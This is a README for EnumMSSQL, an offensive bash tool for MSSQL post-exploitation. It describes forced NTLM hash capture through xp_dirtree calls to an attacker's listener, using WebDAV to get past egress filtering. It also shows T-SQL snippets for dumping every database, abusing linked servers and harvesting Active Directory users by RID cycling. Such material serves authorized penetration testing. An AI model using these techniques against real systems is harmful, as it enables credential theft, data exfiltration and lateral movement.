# EnumMSSQL

<img width="1516" height="360" alt="image" src="https://github.com/user-attachments/assets/5255a21d-a014-4aaa-83a0-4cb15d875a9c" />

**EnumMSSQL** is a weaponized, military-grade, standalone bash wrapper for `impacket-mssqlclient`. It is designed to automate the MSSQL post-exploitation lifecycle, transforming standard enumeration into a highly visual, zero-dependency workflow.

It handles terminal layout healing, background listener management (Responder), port auditing, and LinPEAS-style colorized output for rapid identification of privilege escalation vectors.

This was originally developed as a private tool for my personal engagements and CTF workflows. I've decided to open-source it to streamline MSSQL post-exploitation for the community.

---

## 🎯 Features

* **The Ghost Hunter:** Dynamically maps Linked Servers and utilizes `TRY...CATCH` blocks and RPC calls to test remote execution capabilities and identify "ghost" DNS entries ripe for spoofing.
* **Triple-Threat Hash Capturing:** Automatically spins up a background `Responder` instance, safely isolates its database to prevent "hash skipping", and attempts forced NTLM authentication over both **SMB (445)** and **WebDAV (80)** to bypass strict egress firewalls.
* **Auto-Dump (`--dump`):** Bypasses T-SQL cursor limitations utilizing undocumented stored procedures (`sp_MSforeachdb` / `sp_MSforeachtable`) to seamlessly extract every table from every non-system database into a local flat file.
* **Visual Threat Parsing:** Aggressively filters Impacket's raw TDS rowset output and color-codes the results. High-value PrivEsc vectors (e.g., `is_trustworthy_on`, `xp_cmdshell`, `sysadmin`) are highlighted in **RED**, while system defaults are muted in **YELLOW**.
* **Pre-Flight Port Auditing:** Actively scans your local host for conflicting sockets (Port 80/443/445) before launching listeners, allowing you to selectively kill blocking processes on the fly.
* **Terminal Self-Healing:** Automatically restores TTY state (`stty sane / onlcr`) to prevent the dreaded "staircase" formatting corruption caused by overlapping background processes.

---

## 📦 Dependencies

This tool relies on standard offensive security packages natively available on Kali Linux/Parrot OS:

* `impacket-mssqlclient` (or `mssqlclient.py`)
* `responder`
* Standard Linux utilities: `ss`, `awk`, `sed`, `grep`

---

## 🚀 Usage

```bash
Usage: enum-mssql.sh -u <user> -p <pass> -r <rhost> -l <lhost_or_interface> [options]

Required:
  -u, --user          Username for MSSQL authentication
  -p, --pass          Password for MSSQL authentication
  -r, --rhost         Target IP or Hostname
  -l, --lhost         Local IP or Interface (e.g., tun0) for hash capture

Optional:
  -d, --domain        Domain name (Leave blank for local SQL auth)
  -P, --rport         Target MSSQL Port (Default: 1433)
  -w, --windows-auth  Use Windows Authentication
  -D, --dump          DUMP MODE: Extract all non-system databases to enum-mssql.dump
  -h, --help          Show the help menu

```

### Examples

**Standard Local SQL Authentication:**

```bash
enum-mssql.sh -u SQLGuest -p 'zDPBpaF4FywlqIv11vii' -r 10.129.46.200 -l tun0

```

**Active Directory / Windows Authentication:**

```bash
enum-mssql.sh -d MEGACORP -u sql_svc -p 'Winter2026!' -r 10.10.10.50 -l 10.10.14.5 -w

```

**Database Dump Mode (Extract all custom tables):**

```bash
enum-mssql.sh -u sa -p 'SuperSecret' -r 10.129.46.200 -l tun0 --dump

```

---

### 🦖 See it in Action

<img width="3840" height="2097" alt="image" src="https://github.com/user-attachments/assets/76875007-1eb9-4979-9010-c2c8b9ecced0" />

<img width="3838" height="2095" alt="image" src="https://github.com/user-attachments/assets/df60a172-f52d-4ff4-b782-e2c20c5dc144" />

<img width="3840" height="2098" alt="image" src="https://github.com/user-attachments/assets/d828d153-93a8-49b9-950b-428954b7b842" />

---

## 🛡️ Execution Phases

1. **Basic Server Recon:** Versioning, Hostname, Current User mapping.
2. **Privileges & Roles:** Server-level permissions and Impersonation rights.
3. **Trustworthy Status:** Maps `is_trustworthy_on` for potential DB Owner to Sysadmin escalation.
4. **Current Database Mapping:** Table extraction.
5. **Execution Vectors:** Audits local `xp_cmdshell` and OLE Automation procedures.
6. **CLR Assemblies:** Hunts for custom, user-defined .NET assemblies and extended procedures.
7. **Linked Server Ghost Hunter:** Audits remote links for RPC execution capabilities and dead DNS entries.
8. **Loot Extraction:** Casts varbinary `password_hash` fields to hex strings for direct Hashcat cracking.
9. **Forced NTLM Capture:** Executes `xp_dirtree`, `xp_subdirs`, and `xp_fileexist` over ports 445 and 80.
10. **AD / Domain Account Enumeration & SID Resolution:** Language-agnostic, low-privilege domain user harvesting via recursive RID cycling.
11. **In-Depth Impersonation Path Mapping:** Explores complex chains where logins can explicitly masquerade as other identities.
12. **Data Classification:** Targeted regex scraping for columns containing sensitive keywords like `pass`, `cred`, `secret`, or `token`.

---

## 🧠 Deep-Dive

### 📦 Mass Extraction via Undocumented Procedures (Dump Mode)

Standard T-SQL data extraction across an entire database instance typically requires writing nested, clunky cursors, managing dynamic SQL strings, and keeping track of state - a process that easily breaks or triggers defensive alerts due to heavy execution footprints.

**EnumMSSQL** achieves flat-file dumping using two undocumented internal stored procedures: `sp_MSforeachdb` and `sp_MSforeachtable`.

#### 1. The Global Iterators

These procedures are pre-compiled helper loops built directly into the `master` database by Microsoft for internal administrative automation. They abstract away the need for explicit cursor definitions:

* `sp_MSforeachdb` tokenizes database names using the `?` placeholder.
* `sp_MSforeachtable` tokenizes table names within a database context using the `&` placeholder (customizable via `@replacechar`).

#### 2. Clean System Filtering

To extract only user data, the script wraps the iterative logic inside an inline safety check, entirely ignoring the default system-critical databases:

```sql
IF ''?'' NOT IN (''master'', ''model'', ''msdb'', ''tempdb'')
```

#### 3. Bypassing Context Execution Limits

By embedding `USE [?];` inside the internal command execution block of `sp_MSforeachtable`, the tool dynamically shifts database contexts mid-loop. It prints a clean terminal delimiter (`[+] TABLE: <name>`) and instantly pipes out raw rows, allowing a low-privileged or automated agent to pull a full system snapshot in a single round-trip query.

---

### 👻 Linked Server Auditing & "Ghost" Hunting (Phase 7)

Linked Servers allow an MSSQL instance to execute T-SQL statements against separate, remote database servers. If misconfigured, they create massive lateral movement vectors, especially if `rpc` and `rpc out` features are toggled on.

#### 1. Fault-Tolerant Crawling

A major issue with automated linked server scanning is that if a remote server is offline, the entire T-SQL batch throws a fatal error and terminates execution. The tool wraps the connection routine inside an isolated `TRY...CATCH` block:

```sql
BEGIN TRY 
    EXEC sp_testlinkedserver @srv; 
END TRY 
BEGIN CATCH 
    PRINT '[-] GHOST SERVER DETECTED'; 
END CATCH
```

This isolates connection failures. If a link fails, it identifies it as a "Ghost Server" indicating a dead or orphaned DNS routing entry that could be highly vulnerable to internal spoofing or NetBIOS/LLMNR hijacking.

#### 2. Out-of-Context Execution Paths

If the link is active, the tool attempts to cross execution boundaries using the `AT` syntax:

```sql
EXEC ('...' ) AT [LINKED_SERVER];
```

This forces the local SQL instance to pass the payload over the wire, running it within the security context established by the link configuration (which often defaults to high-privilege mappings like `sa` on the remote side). It queries the remote configuration states without needing an interactive shell on the secondary machine.

---

### 🌐 Multi-Vector NTLM Capture & WebDAV Evasion (Phase 9)

Forcing an MSSQL server to authenticate against an arbitrary external entity is a classic post-exploitation technique, but relying on a single method often fails due to local configuration hardening or aggressive network egress filtering.

**EnumMSSQL** solves this by chaining three distinct extended stored procedures across two different protocols.

```
[MSSQL Server] 
   │
   ├── Port 445  ──► \[\LHOST\a]     ──► Standard SMB Coercion (Blocked by Firewalls)
   └── Port 80   ──► \[\LHOST@80\a]  ──► WebDAV Evasion (Slipped through Egress)
```

#### 1. The Chained Vectors

The script targets three separate file-system interaction procedures:

* `xp_dirtree`: Designed to list folder hierarchies.
* `xp_subdirs`: Designed to list subdirectories only.
* `xp_fileexist`: Designed to check if a specific file exists on disk.

If an administrator has disabled or monitored execution on one of these (e.g., through auditing rules on `xp_cmdshell` alternatives), the tool automatically falls through to the next available vector.

#### 2. Bypassing Port 445 Blocks via WebDAV

Modern enterprise firewalls almost universally block outbound port 445 (SMB) traffic leaving the data center. To bypass this, the tool utilizes the **HTTP/WebDAV translation trick**:

```sql
EXEC master..xp_dirtree '\\\\<LHOST>@80\\a';

```

When Windows parses a UNC path containing `@80`, the underlying `WebClnt` (WebDAV Client) service is invoked. Windows automatically encapsulates the authentication request inside standard HTTP `PROPFIND` packets on port 80. Firewalls view this as ordinary web traffic, allowing the NTLMv2 authentication blob to slip past egress controls straight to your listener.

---

### ❓Language-Agnostic RID Cycling (Phase 10)

Standard SQL enumeration scripts often fail in real-world Active Directory environments because they rely on hardcoded names like `REDELEGATE\Administrator` to grab the Domain SID. If the administrative account has been renamed or the system utilizes a localized language pack (e.g., German `Domänen-Benutzer`), the query immediately fails.

**EnumMSSQL** bypasses this limitation mathematically using a flawless three-step T-SQL approach:

#### 1. The Immutable Anchor (`krbtgt`)

The Key Distribution Center service account `krbtgt` is completely **immutable** within Active Directory. It cannot be deleted or renamed, and it retains the exact same string across *all* localized Windows installations. The script dynamically pairs this account with `DEFAULT_DOMAIN()` to query its identity:

```sql
DECLARE @f VARBINARY(85)=SUSER_SID(CONCAT(DEFAULT_DOMAIN(),N'\krbtgt'));
```

#### 2. Domain SID Isolation

The Windows SID structure returned for `krbtgt` is a 28-byte block, where the final 4 bytes represent its Relative Identifier (RID) which is always 502 (`0x01F6` in hex) for `krbtgt`. By applying `SUBSTRING`, we chop off these final 4 bytes, isolating the pure 24-byte Domain SID:

```sql
SUBSTRING(@f, 1, DATALENGTH(@f)-4)
```

#### 3. Little-Endian Hex Reconstruction & Loop

Using a Recursive Common Table Expression (CTE), the script generates a loop cycling through an integer range of RIDs (500 to 9999). Because Windows SIDs expect the RID component to be stored in Little-Endian format in memory, the algorithm splits the integer into 4 individual bytes using bit-shifting math and appends them back onto the base Domain SID:

```sql
+ CONVERT(VARBINARY(1), rid & 255) 
+ CONVERT(VARBINARY(1), (rid/256) & 255) 
+ CONVERT(VARBINARY(1), (rid/65536) & 255) 
+ CONVERT(VARBINARY(1), (rid/16777216) & 255)
```

Finally, `SUSER_SNAME()` takes this dynamically built binary string and resolves it straight back into a clear-text username.

**The Result:** You harvest the entire Active Directory user directory completely without administrative privileges, without `xp_cmdshell`, without relying on the Active Directory PowerShell module, and completely independent of the target OS language.

---

## ⚠️ Disclaimer

This tool is designed for educational purposes and authorized penetration testing / red teaming only. The author is not responsible for any misuse or damage caused by this script. Never run tools against infrastructure you do not explicitly own or have written permission to test.

---

**Author:** [tralsesec](https://github.com/tralsesec)

**License:** MIT

---
